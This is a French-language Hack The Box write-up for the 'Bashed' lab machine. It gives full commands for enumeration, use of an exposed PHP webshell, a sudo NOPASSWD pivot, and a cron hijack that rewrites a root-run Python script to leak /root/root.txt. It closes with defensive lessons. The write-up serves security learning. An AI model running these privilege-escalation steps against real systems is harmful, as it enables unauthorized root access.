# HTB — Bashed Write-up

- **Machine :** Bashed
- **Plateforme :** Hack The Box
- **OS :** Linux
- **Difficulté :** Easy
- **IP :** 10.129.5.182

---

## Résumé

Bashed s'exploite via un **webshell PHP laissé en clair** dans un répertoire du serveur (`/dev/phpbash.php`). Le foothold se fait donc directement dans le navigateur en tant que `www-data`. La privesc exploite une **règle sudo NOPASSWD** permettant de devenir `scriptmanager`, puis un **cron root** qui exécute un script appartenant à `scriptmanager` — on injecte notre code pour qu'il tourne en root.

---

## 1. Énumération

### Scan Nmap

```bash
nmap -p- 10.129.5.182
```

**Résultat :** un seul port ouvert.

| Port | Service | Version       |
|------|---------|---------------|
| 80   | HTTP    | Apache 2.4.18 |

### Fuzzing de répertoires (Gobuster)

```bash
gobuster dir -u http://10.129.5.182/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt
```

**Découverte clé :** le répertoire `/dev`.

En explorant `/dev`, on trouve :

```
/dev/phpbash.php
```

C'est un **webshell PHP** (phpbash) — une console interactive directement exécutable dans le navigateur.

> **Pourquoi ça marche :** phpbash est un outil de dev/debug qui n'aurait jamais dû rester en prod. Il donne une exécution de commandes arbitraire sans authentification. Réflexe : toujours fuzzer les répertoires "oubliés" (`/dev`, `/backup`, `/old`, `/test`).

---

## 2. Accès initial (foothold)

On ouvre `http://10.129.5.182/dev/phpbash.php` → on obtient un shell interactif dans le navigateur.

Contexte d'exécution :

```bash
whoami
# www-data
```

### Flag user

```bash
cat /home/arrexel/user.txt
```

---

## 3. Élévation de privilèges

### Étape 1 — www-data → scriptmanager

Vérification des droits sudo :

```bash
sudo -l
```

**Résultat :**

```
(scriptmanager) NOPASSWD: ALL
```

→ `www-data` peut exécuter **n'importe quelle commande en tant que `scriptmanager`, sans mot de passe**.

On inspecte ce que possède scriptmanager :

```bash
sudo -u scriptmanager ls -la /scripts
```

**Résultat :**

```
test.py    → propriété de scriptmanager
test.txt   → propriété de root, horodatage récent
```

> **Le signal clé :** `test.txt` appartient à **root** et sa date de modification change régulièrement. Ça trahit un **cron tournant en root** qui exécute `test.py` et écrit `test.txt`. Or `test.py` nous appartient (scriptmanager) → **on contrôle du code exécuté par root**.

### Étape 2 — scriptmanager → root (cron hijack)

Le vecteur : `test.py` est modifiable par nous mais exécuté par root. On réécrit son contenu pour qu'il fasse fuiter le flag root.

phpbash ne gère pas bien le multi-ligne, donc on réécrit le script **en une seule ligne** :

```bash
sudo -u scriptmanager bash -c 'echo "import os; os.system(\"cat /root/root.txt > /tmp/flag.txt; chmod 644 /tmp/flag.txt\")" > /scripts/test.py'
```

Ce que fait le payload :
- root exécutera `test.py` au prochain passage du cron ;
- il lira `/root/root.txt` et le copiera dans `/tmp/flag.txt` ;
- `chmod 644` rend le fichier lisible par `www-data`.

Vérifier que le payload est bien en place :

```bash
sudo -u scriptmanager cat /scripts/test.py
```

### Récupération du flag

Attendre ~1 min (passage du cron), puis :

```bash
cat /tmp/flag.txt
```

→ **flag root**.

---

## Chaîne d'attaque (récap)

```
Nmap (80)
   └─> Gobuster : /dev
        └─> phpbash.php (webshell PHP)
             └─> foothold www-data + user.txt
                  └─> sudo -l : (scriptmanager) NOPASSWD: ALL
                       └─> sudo -u scriptmanager  (pivot)
                            └─> cron root exécute /scripts/test.py (modifiable)
                                 └─> injection payload → root.txt via /tmp
```

---

## Leçons / points de sécu

- **Outils de dev en prod** : phpbash, phpinfo, backups… à ne jamais laisser exposés.
- **sudo NOPASSWD trop large** : un `NOPASSWD: ALL` vers un autre user est un pivot direct. Restreindre au strict binaire nécessaire.
- **Cron + fichier modifiable** : classique. Un processus privilégié ne doit jamais exécuter un fichier writable par un compte moins privilégié.
- **À retenir (pattern général) :** détourner un processus root qui exécute un fichier modifiable (cron, systemd timer, PATH hijack…). C'est un des schémas de privesc Linux les plus fréquents.

---

## Outils utilisés

`nmap` · `gobuster` · navigateur (phpbash) · `sudo` · `cron`
